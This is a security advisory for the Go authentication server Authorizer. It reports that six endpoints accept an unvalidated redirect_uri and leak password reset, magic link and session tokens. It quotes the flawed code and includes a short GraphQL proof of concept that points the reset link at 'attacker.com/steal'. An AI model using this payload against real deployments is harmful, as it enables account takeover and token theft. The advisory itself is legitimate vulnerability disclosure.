# [H] Authorizer: Password reset token theft and full auth token redirect via unvalidated redirect_uri

## Summary
Severity: High
Advisory: GHSA-x3f4-v83f-7wp2
CWE: CWE-601
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-06
Source: https://github.com/advisories/GHSA-x3f4-v83f-7wp2
Type: github-advisory

## Affected
- Go: `github.com/authorizerdev/authorizer` — affected >=0 <0.0.0-20260329085140-6d9bef1aaba3

## Details
Hi,

I found that 6 endpoints in Authorizer accept a user-controlled `redirect_uri` and append sensitive tokens to it without validating the URL against `AllowedOrigins`. The OAuth `/app` handler validates redirect_uri at `http_handlers/app.go:46`, but the GraphQL mutations and verify_email handler skip validation entirely. An attacker can steal password reset tokens, magic link tokens, and full auth sessions (access_token + id_token + refresh_token) by pointing redirect_uri to their server. Verified against HEAD (commit 73679fa).

## Affected Endpoints

1. **ForgotPassword** (`internal/graphql/forgot_password.go:76-77`) - password reset tokens
2. **MagicLinkLogin** (`internal/graphql/magic_link_login.go:150-151`) - magic link auth tokens
3. **Signup** (`internal/graphql/signup.go:211-212`) - email verification tokens
4. **InviteMembers** (`internal/graphql/invite_members.go:90-91`) - invitation tokens
5. **OAuthLoginHandler** (`internal/http_handlers/oauth_login.go:18-20`) - OAuth redirect stored in state
6. **VerifyEmailHandler** (`internal/http_handlers/verify_email.go:27,178`) - full auth tokens (access + id + refresh)

## Root Cause

Because these 6 endpoints completely lack the `validators.IsValidOrigin()` check, this vulnerability bypasses secure configurations. Even if a production administrator strictly configures `AllowedOrigins` to `["https://my-secure-app.com"]`, an attacker can still steal tokens by passing `https://attacker.com` to these specific GraphQL mutations. The validation only exists in the `/app` OAuth handler, not in any of the GraphQL mutations.

In `forgot_password.go:76-77`, the user-supplied `redirect_uri` is accepted without validation:

    if strings.TrimSpace(refs.StringValue(params.RedirectURI)) != "" {
        redirectURI = refs.StringValue(params.RedirectURI)
    }

The reset token is appended to this URL at `internal/utils/common.go:77`:

    func GetForgotPasswordURL(token, redirectURI string) string {
        verificationURL := redirectURI + "?token=" + token
        return verificationURL
    }

Compare with the OAuth flow at `internal/http_handlers/app.go:46` which validates correctly:

    if !validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins) {
        c.JSON(400, gin.H{"error": "invalid redirect url"})
        return
    }

This validation is missing from all 6 endpoints listed above.

## Most Severe Path: Full Token Theft via verify_email

After a user clicks the verification link, `verify_email.go:178` generates full auth tokens and redirects to the (unvalidated) URL:

    params := "access_token=" + authToken.AccessToken.Token +
        "&token_type=bearer&expires_in=" + ... +
        "&id_token=" + authToken.IDToken.Token + "&nonce=" + nonce

The redirect_uri is stored in the JWT claim from the original request (attacker-controlled). The attacker receives the victim's access_token, id_token, and refresh_token directly.

Because tokens are appended as URL query parameters, they are also automatically leaked to the attacker's server access logs, the victim's browser history, and any third-party analytics scripts on the attacker's page via the `Referer` header.

## PoC

    mutation {
      forgot_password(params: {
        email: "victim@example.com"
        redirect_uri: "https://attacker.com/steal"
      }) {
        message
      }
    }

The victim receives a legitimate password reset email with the link `https://attacker.com/steal?token=<reset_token>`. Clicking the link sends the reset token to the attacker.

## Impact

- Account takeover via stolen password reset tokens
- Full session theft via stolen access_token + id_token + refresh_token
- Passwordless account compromise via stolen magic link tokens
- No authentication required to trigger (the GraphQL mutations are public)
- Victim only needs to click the email link from their trusted Authorizer instance

## Additional Note

The default `AllowedOrigins` at `cmd/root.go:39` is `["*"]`, so even the OAuth endpoint's validation is a no-op by default. Recommend changing the default to require explicit configuration.

Koda Reef

## References
- https://github.com/authorizerdev/authorizer/security/advisories/GHSA-x3f4-v83f-7wp2
- https://github.com/authorizerdev/authorizer/pull/502
- https://github.com/authorizerdev/authorizer/commit/6d9bef1aaba3f867f8c769b93eb7fc80e4e7b0a2
- https://github.com/authorizerdev/authorizer
- https://github.com/authorizerdev/authorizer/releases/tag/2.0.1
